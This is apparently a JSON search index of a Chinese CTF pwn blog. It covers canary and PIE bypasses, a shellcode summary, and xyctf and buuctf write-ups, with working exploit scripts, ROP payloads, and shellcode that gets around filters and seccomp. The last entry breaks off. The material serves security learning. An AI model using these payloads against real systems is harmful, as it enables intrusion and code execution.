[{"title":"Canary的绕过","url":"/2025/04/05/Canary%E7%9A%84%E7%BB%95%E8%BF%87/","content":"写了这么久的题了，但是看到题还是一头雾水，完全在瞎碰，写个小总结，系统整理整理吧\n从保护开始\n1. Canary1.1 原理Canary就是在栈底放一个随机数，如果缓冲区变量溢出，那么这个随机数也会被篡改，当函数结束的时候会对这个随机数检查，如果发现这个随机数变了，就会执行_stack_chk_fail函数终止程序\n从汇编角度看：函数序言会向保存调用函数的栈底指针，然后设置被调用函数自身的栈底指针，最后分配栈空间，这3条汇编指令标志着一个经典的函数序言\n\n 比如buuctf中的bjdctf_2020_babyrop2，有开启Canary保护，就存在这样的代码\n mov     rbp, rspsub     rsp, 20hmov     rax, fs:28h\n但是Canary的非即时检测就留下了一定的操作空间：\n只要可以让Canary在函数未结束前泄露出来，构造payload时在它本应在的位置写上Canary就可以了\n所以问题就变为了如何泄露出来Canary，了解一下Canary随机值的特点\n（或者修改指向_stack_chk_fail的地址，让函数走向后门函数）\n\n一般Canary会在ebp-0x8处存储，\n\n其最低位设置为\\x00\n\n 这里本意时为了保证字符串可以被\\x00截断，从而保护其它字节信息\n\n\n\n1.2绕过思路1.2.1 覆盖截断获取随机值先填充缓冲区变量到Canary的最低字节，然后获取泄露的Canary，最后根据Canary的值填充rbp-0x8的位置，此后调用函数栈指针可以随意覆盖\n假设有一个题目这样布局\nchar buf[24]; // [rsp+0h] [rbp-20h] BYREFunsigned __int64 v2; // [rsp+18h] [rbp-8h]\n\n可以这样覆盖并泄露\noff_set = b&#x27;A&#x27;*(0x20-0x8)p.sendline(off_set)result = p.recvuntil(b&#x27;a&#x27;*(0x20-0x8)+b&#x27;\\n&#x27;)canary = u64(b&#x27;\\x00&#x27;+p.recv(7))\n\n1.2.2 格式化字符串直接泄露格式化字符串可以完成任意位置读写操作，所以泄露Canary值也是很轻松的\n以上面的例子来看\n假设测试得到我们输入的内容在栈中第6个位置，并且栈顶到Canary的距离为0x18(0x20-0x8)\n而一个不带长度的格式化字符会输出8&#x2F;4个字节大小的数据，0x18/0x8=3,所以应该在第6+3=9位置处\npayload如下：\npayload = b&#x27;%9$x&#x27;p.sendline(payload)canary = int(p.recvuntil(&#x27;\\n&#x27;)[:-1],16)\n\n1.2.3 逐字节爆破绕过Canary\n适用于有通过fork()函数创建的子进程的程序\n\n某些题目中存在fork()函数，且程序开启了Canary函数，当程序进入到子进程的时候，其Canary的值和父进程中Canary的值一样（因为fork函数为拷贝父进程的内存），一次你在一定体哦阿健下我们可以将Canary爆破出来\n需要的条件有：\n\n程序中存在栈溢出的漏洞\n可以覆盖到Canary的位置\n\n\n对于32位程序，只需要对3字节进行爆破，爆破方式是先利用栈溢出复写次低字节，如果出错的化会报错并且重启子进程，获得正确的次低节点就不会报错，获取正确此地节点之后依次爆破次高字节和高字节\n\n例程：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;  #include &lt;sys/wait.h&gt; void getshell(void)&#123;    system(&quot;/bin/sh&quot;);&#125; void init(void)&#123;    setbuf(stdin, 0);    setbuf(stdout, 0);    setbuf(stderr, 0);&#125; void vuln(void)&#123;    char buf[100];    memset(buf, 0, sizeof(buf));    read(0, buf, 0x200);    printf(&quot;%s\\n&quot;, buf);&#125;int main(void)&#123;    init();    while (1)    &#123;        printf(&quot;Hello Hacker!\\n&quot;);        if (fork()) //father        &#123;            wait(NULL);        &#125;        else //child        &#123;            vuln();            exit(0);        &#125;    &#125;     return 0;&#125;\n\ngcc pwn.c -no-pie -m32 -fstack-protector -z noexecstack -o pwn编译\npayload构造\ncanary = b&#x27;\\x00&#x27;for i in range(3):    for j in range(0,256):        payload = b&#x27;a&#x27;*(0x70-0xC)+canary+p8(j)        p.send(payload)        # time.sleep(0.1)        res = p.recv()        if (b&#x27;stack smashing detected&#x27; not in res):            print(f&#x27;the &#123;i&#125; is &#123;hex(j)&#125;&#x27;)            canary +=p8(j)            break    assert(len(canary) == i+2)log.info(&#x27;Canary；&#x27;+hex(u32((canary))))\n\n1.2.4 SSP泄露Canary\n使用与Flag存储于内存空间中的情况\n\nSSP全称为Stack Smashing Protect，这种方法可以读取内存中的值，当flag在内存中储存时，就可以用这个方法读取flag\n直接看这篇文章叭\n1.2.5 劫持_stack_chk_fail函数如果Canary不对，程序会转到stack_chk_fail函数执行，而这个函数是一个普通的延迟绑定函数，可以通过修改GOT表来劫持这个函数\n例程：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;void getshell(void)&#123;    system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[])&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);     char buf[100];    read(0, buf, 200);#栈溢出    printf(buf);    return 0;&#125;\n\n gcc pwn.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o pwn编译\n\n\n劫持函数要修改GOT表，所以关闭RELRO\n调用getshell函数，关闭pie\n\n\n我们直到GOT表中存的是函数的实际地址，如果把_stack_chk_fail函数的got表地址替换为getshell的地址，在canary出错的情况下，调用_stack_chk_fail时就会直接获取到shell\n直接用fmtstr_payload就行\n_stack_chk_fail_got = elf.got[&#x27;_stack_chk_fail&#x27;]backdoor = elf.sym[&#x27;getshell&#x27;]payload = fmtstr_payload(10,&#123;stack_chk_fail_got:backdoor&#125;)payload = payload.ljust(0x70,b&#x27;a&#x27;)p.send(payload)\n\n","categories":["summary"],"tags":["bypass","canary"]},{"title":"PIE绕过","url":"/2025/04/05/PIE%E7%BB%95%E8%BF%87/","content":"1，PIE介绍\nPIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。\n\n简单来说，在开启PIE之后，你不能再查找到代码段的绝对地址了，只能看到一个地址的后四位数字。\n这个地址并不是程序实际运行地址，而是于程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了PIE之后，每次运行程序的加载基址都是不同的\n程序的实际运行地址=程序加载基址+程序偏移地址\n注意：开启pie保护之后pwngdb调试的时候不能下断点，需要通过b *$rebase(offset)这种方式下断点，offset是ida中反汇编出来的程序地址偏移量\n2.绕过方式2.1 格式化字符串泄露真实地址\n无敌的格式化字符串又一次展现了它的神力\n\n如果一个程序中存在格式化字符串漏洞。我们就可以配合格式化字符串漏洞将程序某个函数的真实地址泄露出来\n直接写个exp:\np.sendline(b&#x27;aaaa%12$p&#x27;)p.recvuntil(b&#x27;aaaa&#x27;)base_addr = int(p.recv(14),16)-offset # offset为偏移地址，这个需要动态调试查看\n\n2.2 partial write\npartial  write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。\n\n省流： 不管程序加载基址怎么变化，偏移量和真实地址的最后三位都是一样的\n假设后门函数地址为0x09C5\nexp:\npayload = b&#x27;a&#x27;*0x30 + b&#x27;a&#x27;*0x8 + b&#x27;\\xC5\\x09&#x27; # 第二字节可能\\x19、\\x29...尝试一下\n\n","categories":["summary"],"tags":["bypass","PIE"]},{"title":"The Summary of Shellcode","url":"/2025/04/15/Shellcode/","content":"其实想要做的是代码注入总结篇\n基础shellcode的书写要做shellcode，认为有下面几点要解决：\n\n一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有mprotect函数或者mmap函数，可以对指定内存区域申请权限\n需要知道写入地址，或者让寄存器指向写入的代码块\n\n直接pwntools生成/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) *//* push b&#x27;/bin///sh\\x00&#x27; */push 0x68mov rax, 0x732f2f2f6e69622fpush raxmov rdi, rsp/* push argument array [&#x27;sh\\x00&#x27;] *//* push b&#x27;sh\\x00&#x27; */push 0x1010101 ^ 0x6873xor dword ptr [rsp], 0x1010101xor esi, esi /* 0 */push rsi /* null terminate */push 8pop rsiadd rsi, rsppush rsi /* &#x27;sh\\x00&#x27; */mov rsi, rspxor edx, edx /* 0 *//* call execve() */push SYS_execve /* 0x3b */pop raxsyscall\n\n这里将/bin/sh直接压入栈中，然后利用rsp的偏移获取地址，直接生成shellcraft.sh()生成即可，不做过多介绍\n限制长度的shellcode（x86)xor rsi,rsipush rsimov rdi, 0x68732f2f6e69622fpush rdipush rsppop\t rdimov  al, 59cdqsyscall\n\n总长度为22（0x16)字节，实现的是execve(&#39;/bin/sh&#39;,&#123;&#39;sh&#39;&#125;,0)，构造出来的条件是这样的：\n\nrax:0x3b\nrdi:’&#x2F;bin&#x2F;sh’\nrsi:’sh’\nrdx:NULL\n\n但是注意，需要eax的高二位为0(一般没什么问题)\nbytes形式：\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n可见字符形式(AE64生成)：\n关于ae64,直接看这里就可以\nWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP\n\n当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）\n\n例如tgctf2025的shellcode，这里\n\n字符限制shellcode一般会出现过滤掉某些特定字符，这时候可以用自改变shellcode或者某些纯字母的shellcode\n纯字母（这里用的是V3rdant的shellcode）\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129/* from call rax */push raxpush raxpop rcx/* XOR pop rsi, pop rdi, syscall */push 0x41413030pop raxxor DWORD PTR [rcx+0x30], eax/* XOR /bin/sh */push 0x34303041pop raxxor DWORD PTR [rcx+0x34], eaxpush 0x41303041pop raxxor DWORD PTR [rcx+0x38], eax/* rdi = &amp;&#x27;/bin/sh&#x27; */push rcxpop raxxor al, 0x34push rax/* rdx = 0 */push 0x30pop raxxor al, 0x30push raxpop rdxpush rax/* rax = 59 (SYS_execve) */push 0x41pop raxxor al, 0x7a/* pop rsi, pop rdi*//* syscall */ .byte 0x6e.byte 0x6f.byte 0x4e.byte 0x44/* /bin/sh */.byte 0x6e.byte 0x52.byte 0x59.byte 0x5a.byte 0x6e.byte 0x43.byte 0x5a.byte 0x41\n\n这一段shellcode可以绕过\\x05\\x0f的过滤，但是注意这里需要由call rax启动\n自改变shellcode（这里用的whuctf2025中shell_for_shell）\nmov si, word ptr [r15 + 0x100]\t;r15的值+0x100，赋给si（rsi，16位模式)   add si, 0x101\t\t\t\t\t;再将si加上0x101   mov word ptr [r15 + 0x100], si\t;修改后的si存给r15+0x100的内存位置   /*这里是为了给后面syscall找个确定位置，顺便自加一*/   push 0x68\t\t\t\t\t\t;压入&quot;h&quot;   mov rax, 0x732f2f2f6e69622f\t\t;压入/bin///s到rax中   push rax\t\t\t\t\t\t;压入rax中的值   mov rdi, rsp\t\t\t\t\t;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve   push 0x1010101 ^ 0x6873\t\t\t;异或的值压栈，避免显式空字节   xor dword ptr [rsp], 0x1010101\t;异或解密栈顶4字节，得到&#x27;sh\\x00&#x27;   xor esi, esi /* 0 */   push rsi \t\t\t\t\t\t;作为字符串的\\x00   push 8\t\t\t\t\t\t\t;压入8，后面计算‘sh\\x00&#x27;字符串地址用   pop rsi\t\t\t\t\t\t\t;将8弹给rsi   add rsi, rsp\t\t\t\t\t;rsi=8+rsp，指向&#x27;sh\\x00&#x27;   push rsi \t\t\t\t\t\t;压入sh\\x00   mov rsi, rsp   xor edx, edx /* 0 */   /* call execve() */   push SYS_execve \t\t\t\t;等价于push 0x3b   pop rax\t\t\t\t\t\t\t;弹给rax\n\n注入时\npayload = (b&quot;\\x00\\xc0&quot;+asm(shellcode)).ljust(0x100-3, b&quot;\\x90&quot;)+b&quot;\\x0e\\x04&quot;\n\n详细解释见这里的自改变shellcode\norw自动生成\npwntool里有自己的orw生成，但是字节比较长，一般情况下都不太合适,仅作参考\n这里是buuctf第45题pwnable_orw题解中摘取的\nbss = 0x804A060shellcode = shellcraft.open(&#x27;flag&#x27;)shellcode+=shellcraft.read(&#x27;eax&#x27;,bss+100,100)shellcode+=shellcraft.write(1,bss+100,100)payload = asm(shellcode)\n\n长度为0x36字节\n短字节\n所以这里一般使用另一种总计0x28字节，要求:\n\nrsp指向的地址必须可用\n存在NULL字符（不存在\\x00导致截断）\n不可指定地址\n\n// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi  #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2  mov eax,edisyscall  \n\nbytes:\n\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05\n\n可指定地址\nshellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi  mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0))\n\n长度比0x90大\n书写更短的shellcode前面在基础shellcode的书写中已经说过很多了，这里主要提几个tip\n使用残留寄存器依旧是用tgctf2025的shellcode举例，动调发现寄存器除了rdi外全部清空，且限制0x12字节\n但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode\nshellcode = asm(&#x27;&#x27;&#x27;mov rdi,0xaadd rax,0x3bsyscall&#x27;&#x27;&#x27;)payload = shellcode+b&#x27;/bin/sh\\x00&#x27;\n\n特殊指令的使用\ncwd系列:\n\nCWD: AX符号位拓展到DX\n\nCDQ: EAX符号位拓展到EDX⭐\n\nCQO：RAX符号位拓展到RDX\n\nCBW: AL符号位拓展到DX\n\n\n\n\n寄存器复用书写受限制的shellcode字符限制一般是坏字符（\\x00),syscall过滤（\\x05\\x0f),可见字符\n可见字符前面已经说过了，利用alpha3和ae64进行编码，这边优劣如下\n\n\n\n\nae64\nalpha3\n\n\n\nx32位编码为可见字符\n❌\n✔\n\n\nx64位编码位可见字符\n✔\n✔\n\n\n原shellcode是否可以包含零字节\n✔\n❌\n\n\n基址寄存器是否可以包含偏移量\n✔\n❌\n\n\nsyscall过滤\n其中一种方法上面已经介绍过了，使用自改变shellcode。如果可操作空间够大的话，还可以尝试read重新读入shellcode\n具体过程就是：布置栈帧，调用read-&gt;利用read将shellcode读入指定地点-&gt;实现getshell\n依旧用whuctf2025的shell_for_shell举例，这里可见powchan的exp:\nshellcode = &quot;&quot;&quot;\tmov rbp, 0x404500    mov rsp, rbp    lea r15, [rip+0xe00]    sub r15, 0xe16    mov rdi, r15    mov rsi, 0x1000    mov rdx, 0x7    mov rax, 0x401070    call rax    mov rsi, r15    add rsi, 0x86    mov rdi, 0    mov rdx, 0x100    mov rax, 0x401050    call rax    /* push syscall number */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    &quot;&quot;&quot;payload = b&quot;\\x00\\xc0&quot;+asm(shellcode)print(payload)io.send(payload)pause()io.send(asm(&quot;syscall&quot;))io.interactive()\n\n坏字符\n坏字符过滤的话可以直接去这里找不含\\x00的shellcode\n注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\\x00’就结束了，所以我们需要特定的shellcode\nxor ecx, ecxmul ecxpush ecxpush 0x68732f2fpush 0x6e69622fmov ebx, espmov al, 11int 0x80\n\nxor    rsi, rsipush   rsimov    rdi, 0x68732f2f6e69622fpush   rdipush   rsppop    rdimov    al, 0x3bcdq    syscall\n\n共22字节数（其实和上面最短shellcode一样的）\nb&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;\n\nb&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;\n\n特定位置限制这里有几个思路\n\n利用read函数再次读入，且将读入地址写为合适地址，这种适合给定的shellcode长度比较短\nssize_t read(int fd, void *buf, size_t count)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\nfd\nrdi\n0表示从用户输入的值中读取\n\n\nbuf\nrsi\n输入到的地址\n\n\ncount\nrdx\n输入的长度\n\n\n\n利用mprotect重新为特定地址申请权限\nint mprotect(void *addr, size_t len, int prot)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\naddr\nrdi\n内存起始地址\n\n\nlen\nrsi\n处理的长度\n\n\nproc\nrdx\n保护（1为r,2为w,4为x)\n\n\n\n利用mmap类函数申请开辟特定权限的空间\nvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\nstart\nrdi\n开始地址，0表示系统指定\n\n\nlength\nrsi\n映射区长度，不足一页按照一页来处理\n\n\nprot\nrdx\n保护标志，同上\n\n\nflags\nr10\n映射对象的类型，一般设置22\n\n\nfd\nr8\n文件描述符，设置-1就可以\n\n\noffset\nr9\n被映射对象内容的起点\n\n\n\n\nseccomp绕过level1 开放open,read,writepush   0x67616c66mov    rdi, rspxor    esi, esipush   0x2pop    raxsyscall mov    rdi, raxmov    rsi, rspmov    edx, 0x100xor    eax, eaxsyscall mov    edi, 0x1mov    rsi, rsppush   0x1pop    raxsyscall\n\nlevel2 关闭openmov rax,0x0067616c662fpush raxmov rsi,rspxor rdx,rdxmov rax,257syscallxor rdi,rdiinc rdimov rsi,raxxor rdx,rdxmov r10,0x100 # 读取文件的长度,不够就加mov rax,40syscall\n\nb&#x27;H\\xb8/flag\\x00\\x00\\x00PH\\x89\\xe6H1\\xd2H\\xc7\\xc0\\x01\\x01\\x00\\x00\\x0f\\x05H1\\xffH\\xff\\xc7H\\x89\\xc6H1\\xd2I\\xc7\\xc2\\x00\\x01\\x00\\x00H\\xc7\\xc0(\\x00\\x00\\x00\\x0f\\x05&#x27;\n\nlevel3 openat readv writevmov rax,0x0067616c662fpush raxmov rsi,rspxor rdx,rdxmov rax,257syscallmov rdi,raxpush 0x100 # 读入大小由这个控制mov rbx,rspsub rbx,0x108 # 为读入大小加8push rbxmov rsi,rspmov rdx,1mov rax,19syscallmov rdi,1mov rsi,rspmov rdx,1mov rax,20syscall\n\nb&#x27;H\\xb8/flag\\x00\\x00\\x00PH\\x89\\xe6H1\\xd2H\\xc7\\xc0\\x01\\x01\\x00\\x00\\x0f\\x05H\\x89\\xc7h\\x00\\x01\\x00\\x00H\\x89\\xe3H\\x81\\xeb\\x08\\x01\\x00\\x00SH\\x89\\xe6H\\xc7\\xc2\\x01\\x00\\x00\\x00H\\xc7\\xc0\\x13\\x00\\x00\\x00\\x0f\\x05H\\xc7\\xc7\\x01\\x00\\x00\\x00H\\x89\\xe6H\\xc7\\xc2\\x01\\x00\\x00\\x00H\\xc7\\xc0\\x14\\x00\\x00\\x00\\x0f\\x05&#x27;\n\nlevel3.5 openat2 read writemov rax, 0x67616c66 # 路径push raxxor rdi, rdisub rdi, 100mov rsi, rsppush 0push 0push 0mov rdx, rspmov r10, 0x18push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall\n\nb&#x27;H\\xc7\\xc0flagPH1\\xffH\\x83\\xefdH\\x89\\xe6j\\x00j\\x00j\\x00H\\x89\\xe2I\\xc7\\xc2\\x18\\x00\\x00\\x00h\\xb5\\x01\\x00\\x00X\\x0f\\x05H\\x89\\xc7H\\x89\\xe6\\xba\\x00\\x01\\x00\\x001\\xc0\\x0f\\x05\\xbf\\x01\\x00\\x00\\x00H\\x89\\xe6j\\x01X\\x0f\\x05&#x27;\n\nTips\n有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\\x00起手的指令，绕过判断\n\n在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址\n\n在32位程序中，还可以通过call指令获取将运行地址压入栈中\n在64位地址中，可以直接通过 lea rax, [rip] 来获取rip地址\n\n\n有些时候如果开启了PIE、ASLR保护，地址未知，可以尝试泄露fs寄存器中的值，可以见这篇\n\n\n","categories":["summary"],"tags":["shellcode"]},{"title":"xyctf-pwn","url":"/2025/04/11/xyctf/","content":"还在更新中，复现网站在这里\narknights栈迁移+read读\n先贴exp：\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20998#p = process(&#x27;./pwn&#x27;)p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)#gdb.attach(p)pop_rdi = 0x00000000004018e5leave = 0x0000000000401393sys = 0x000000000401130read = 0x0000000004018A8p.sendline(b&#x27; &#x27;)p.sendline(b&#x27;4&#x27;)p.sendline(b&#x27;1&#x27;)payload = b&#x27;a&#x27;*0x40+p64(elf.bss(0x408))+p64(read)pause()p.send(payload)pause()payload2 = b&#x27;/bin/sh\\x00&#x27;*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)pause()p.send(payload2)pause()p.sendline(&#x27;exec 1&gt;&amp;0&#x27;)p.interactive()\n\n前面抽卡那里没什么问题，直接跳过\n\n这里可以看到read(0,s,0x60)这里存在栈溢出，溢出了0x20字节，并且执行system指令，那么我们的利用思路就很清晰了：\n覆写rbp为bss段地址-&gt;利用read函数将/bin/sh写入bss段(这里vmmap看过了，bss段可写)-&gt;通过pop rdi执行/bin/sh\npayload = b&#x27;a&#x27;*0x40+p64(elf.bss(0x408))+p64(read)\n\nelf.bss(offset)函数：返回值为int,为.bss段的地址，加上特定的offset。在这里就是返回到bss段+0x408的位置\n\n这里调试可以看到，我们将rbp覆盖为了bss段某个地址，接下来就是执行read相关的指令，且read将读入的内容存放在rbp-0x40处\npayload2 = b&#x27;/bin/sh\\x00&#x27;*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)\n\n接下来因为调用的还是这个read(0,s,0x60)，所以先填充0x40字节的/bin/sh\\x00到bss段，接下来再次覆盖rbp为0，执行pop_rdi，弹出bss段+0x400-0x20处的内容\n官方ret2text解from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20476p = process(&#x27;./pwn&#x27;)#p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)gdb.attach(p)pop_rdi = 0x00000000004018e5count = 0x000000000405BCCsys = 0x0000000004018FC# sh p64(26739)payload = b&#x27;a&#x27;*0x48+p64(pop_rdi)+p64(count)+p64(sys)def ck(n):    p.recv()    p.sendline(b&#x27;3&#x27;)    p.recv()    p.sendline(str(n).encode())    p.sendline(b&#x27;\\n&#x27;)p.sendline(b&#x27;a&#x27;)ck(10000)ck(10000)ck(6739)p.recv()p.sendline(b&#x27;4&#x27;)p.recv()p.sendline(b&#x27;1&#x27;)pause()p.sendline(payload)pause()p.sendline(b&#x27;exec 1&gt;&amp;2&#x27;)p.interactive()\n\n\n这里跟进star()函数\n\n看到sum_count会根据抽卡次数加加\n那么我们可以通过合理控制sum_count的值，使之变成sh\n❯ python3Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; print(u64(b&#x27;sh&#x27;.ljust(8,b&#x27;\\x00&#x27;)))26739\n\n所以，后面就很简单了\nEZ3.0mips架构，但是简单栈溢出，甚至有gadget\n先贴exp：\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20860#p = process(&#x27;./pwn&#x27;)p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)#gdb.attach(p)gadget = 0x0400A20binsh = 0x0411010door = 0x409c8sys  =0x0400B70payload = b&#x27;a&#x27;*32+b&#x27;a&#x27;*0x4+p32(gadget)+p32(0)+p32(sys)+p32(binsh)p.sendline(payload)p.interactive()\n\n\nida竟然也能逆这个，还是太强大了\n一眼栈溢出，左边还有个JustIsBackdoor\n\n源码一看，下面跟着就是gadget（不知道意思的话直接问问ai）\npayload就很好写了，以下略\n","categories":["wp"],"tags":["wp"]},{"title":"buuctf","url":"/2025/04/05/buuctf/","content":"buuctf刷题记录（1-20题）by Maple\n有人说我的前面的题解没解析，看不懂？那我来补上了\n1 test_ncnc 节点 端口\n\n没有nc？去看这篇！\n\n然后cat flag\n\ncat:catch 抓住。就是显示文件中的内容\n\n2 rip打开ida看下源码\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  char s[15]; // [rsp+1h] [rbp-Fh] BYREF  puts(&quot;please input&quot;);  gets(s, argv);  puts(s);  puts(&quot;ok,bye!!!&quot;);  return 0;&#125;\n\n看到一个不限制输入长度的gets()函数，并且根据ida的分析，s位于栈底（rbp）上方0xF处,那么我们输入0xF字节之后再覆盖掉rbp，是不是就到了rbp下面的返回地址处？那么我们把后门函数的地址写在返回地址处，不就可以跳转到后门函数了嘛\n\n为什么rbp下面是返回地址？罚你看这篇\n\nexp:\nfrom pwn import *p = process(&#x27;./pwn1&#x27;)p.sendline(b&#x27;a&#x27;*0xF+b&#x27;b&#x27;*0x8+p64(0x40118a))p.interactive()\n\n3 warmup_csaw_2016和上一题是一样的，可以将v5和rbp覆盖，然后篡改返回地址\nexp:\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28694)payload = b&#x27;a&#x27;*72+p64(0x40060d)p.sendline(payload)p.interactive()\n\n在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell\n4 ciscn_2019_n_1看下ida逆出来的代码\n\n发现想要获取flag的内容，需要v2=11.28125,但是，我们一定要让if执行嘛，一定要合程序的意嘛，都打pwn了，怎么可以顺着程序的意来呢\n所以有两种思路，一种是覆盖返回地址，一种是覆盖v2\n\n覆盖返回地址，直接return system处\nexp:\n\n\nfrom pwn import *p = process(&#x27;./pwn&#x27;)retaddr=0x4006BEpayload=b&#x27;a&#x27;*56+p64(retaddr)p.sendline(payload)p.interactive()\n\n\n覆盖v2数值\n可以看到我们的输入是在v2赋值之后的事，所以可以通过溢出来把v2的值给覆盖了，0x2c = 0x30-0x4\n\n不知道为什么填充的是0x4138000?学一下浮点数的存储叭，或者，按下tab，对准那个黄色的地方双击（如果不是这样子的话按下空格）\n\n\n你就得到了11.28125的十六进制存储\n\n\n\n\nexp：\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = b&#x27;a&#x27;*0x2c+p64(0x41348000)p.sendline(payload)p.interactive()\n\n5 pwn1_sctf_2016限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = b&#x27;I&#x27;*20+b&#x27;a&#x27;*4+p32(0x8048F0D)p.sendline(payload)p.interactive()\n\n这次学好了，先在本地创建了一个flag.txt的文件\n6 jarvisoj_level0ret2text不多说了(用了下自己的模板，有很多不需要)\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;&#x27;,)def dbg():    gdb.attach(p)    pause()payload = b&#x27;a&#x27;*0x80+b&#x27;b&#x27;*0x8+p64(0x40059A)p.sendline(payload)p.interactive()\n\n7 